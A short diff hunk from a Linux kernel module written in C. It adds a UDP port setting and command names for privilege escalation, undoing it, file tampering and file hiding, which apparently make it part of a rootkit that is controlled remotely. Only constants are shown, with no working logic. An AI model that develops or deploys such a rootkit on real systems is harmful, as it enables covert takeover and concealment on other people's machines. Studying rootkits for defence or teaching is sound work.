@@ -14,7 +14,16 @@
 #include <linux/kallsyms.h>
 #include <linux/cred.h>
 
+/* settings for UDP server */
 #define UDP_PORT 1111
+#define MAX_UDP_BUFF 128
+
+/* code for commands */
+#define DO_PRIV_ESC "privesc"
+#define UNDO_PRIV_ESC "undo-privesc"
+#define DO_TAMPER_FILE "tamper-file"
+#define DO_HIDE_FILE "hide-file"
+
 #define DEBUG_ENABLED 1
 
 /*
